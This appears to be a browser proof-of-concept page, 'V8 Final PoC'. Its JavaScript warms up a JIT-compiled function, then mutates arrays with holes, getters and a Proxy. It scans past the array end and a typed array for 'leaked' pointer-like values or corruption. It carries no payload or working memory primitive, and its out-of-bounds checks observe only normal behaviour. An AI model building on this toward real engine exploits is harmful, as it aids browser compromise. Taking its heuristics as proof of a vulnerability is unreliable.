<!doctype html>
<meta charset="utf-8">
<title>V8 Final PoC - JIT Instability / Leak Probe</title>

<pre id="log"></pre>
<script>
const log = m => {
  document.getElementById("log").textContent += m + "\n";
  console.log(m);
};

// =======================
// TARGET
// =======================
function vuln(a,i){ return a[i] + 1.1; }

// =======================
// WARMUP (JIT trigger)
// =======================
function warmup(){
  let arr = Array.from({length:30}, (_,i)=>i+0.5);
  for(let i=0;i<60000;i++){
    vuln(arr, i % 30);
  }
  return arr;
}

// =======================
// MUTATION (controlled chaos)
// =======================
function mutate(arr){
  // holes
  delete arr[0];
  delete arr[1];
  delete arr[2];

  // shrink + extend
  arr.length = 10;
  arr[60] = 13.37;

  // mix types
  arr[2] = {x:1};

  // getter side-effect (limited)
  let hit = 0;
  Object.defineProperty(arr,3,{
    get(){
      if(hit++ < 2){
        arr.push(99.99 + hit);
      }
      return 1.1;
    }
  });

  return arr;
}

// =======================
// PROXY (break assumption)
// =======================
function breakAssumption(a){
  let toggle = 0;
  return new Proxy(a,{
    get(t,p){
      if(p === "length"){
        if((toggle++ % 2) === 0){
          t.push(77.77);
        }
      }
      return Reflect.get(t,p);
    }
  });
}

// =======================
// TYPED ARRAY (detect corruption)
// =======================
let buf = new ArrayBuffer(0x4000);
let f64 = new Float64Array(buf);

// baseline pattern
for(let i=0;i<f64.length;i++){
  f64[i] = 0x41414141 + i;
}

// =======================
// MAIN
// =======================
function run(){
  log("[*] warmup");
  let base = warmup();

  log("[*] trigger");

  let arr = [...base];
  arr = mutate(arr);
  arr = breakAssumption(arr);

  // === RAW VALUE CHECK ===
  let raw = arr[10];
  log("[RAW] arr[10] = " + raw);
  log("[TYPE] " + typeof raw);

  // === JIT CALL ===
  let r1 = vuln(arr,3);
  let r2 = vuln(arr,10);
  let r3 = vuln(arr,60);

  log("r1=" + r1);
  log("r2=" + r2);
  log("r3=" + r3);

  // =======================
  // NaN DETECTION (key signal)
  // =======================
  if(Number.isNaN(r2)){
    log("[!] NaN detected → possible JIT confusion");

    // scan around area
    for(let i=5;i<25;i++){
      log("[SCAN] arr["+i+"] = " + arr[i]);
    }
  }

  // =======================
  // OOB READ CHECK
  // =======================
  for(let i=0;i<40;i++){
    let idx = arr.length + i;
    let v = arr[idx];

    if(v !== undefined){
      log("[OOB] idx="+idx+" val="+v);
    }

    if(typeof v === "number" && Math.abs(v) > 1e12){
      log("[PTR-LIKE] "+v);
    }
  }

  // =======================
  // TYPED ARRAY CORRUPTION CHECK
  // =======================
  for(let i=0;i<80;i++){
    let v = f64[i];

    if(v !== 0x41414141 + i){
      log("[CORRUPTION] idx="+i+" val="+v);
    }
  }

  log("[*] done");
}

run();
</script>
